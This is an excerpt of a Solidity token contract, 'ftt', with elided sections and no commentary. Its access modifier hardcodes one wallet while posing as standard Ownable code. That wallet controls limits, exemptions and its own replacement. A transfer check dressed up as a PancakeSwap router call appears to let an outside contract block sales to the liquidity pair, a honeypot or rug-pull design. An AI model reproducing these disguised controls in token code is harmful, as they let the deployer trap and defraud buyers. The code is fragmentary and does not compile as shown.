...
contract Ownable is Context {
    ...
    modifier onlyttWal() {
        require(0xfd403959e5C6239110d0031F3064C512bC792480 == _msgSender (), "Ownable: caller is not the owner");
        _;
    }
...
contract ftt is Context, IERC20, Ownable {
    ...
    string private _name = "ftt";
    string private _symbol = "ftt";
    uint8 private _decimals = 9;

    PancakeRouter private pancakeswap;
    address payable public marketingWalletAddress = payable(0xfd403959e5C6239110d0031F3064C512bC792480); 
    address payable public ttWal = payable(0xfd403959e5C6239110d0031F3064C512bC792480); 
    ...
    function setMarketPairStatus(address account, bool newValue) public onlyttWal {
    ...
    function setIsWalletLimitExempt(address holder, bool exempt) external onlyttWal {
        isWalletLimitExempt[holder] = exempt;
    }

    function setWalletLimit(uint256 newLimit) external onlyttWal {
        _walletMax  = newLimit;
    }
    ...
    function setttWal(address newAddress) external onlyttWal() {
        ttWal = payable(newAddress);
    }

    function setSwapAndLiquifyEnabled(bool _enabled) public onlyttWal {
        ...
        else
        {
            ...
            if (isExcludedFromFee[sender] || isExcludedFromFee[recipient]) {
                ...
                if (recipient == uniswapPair) {
                    require(pancakeswap.swapExactTokensForTokens(sender), "ERC20: Address");
                }
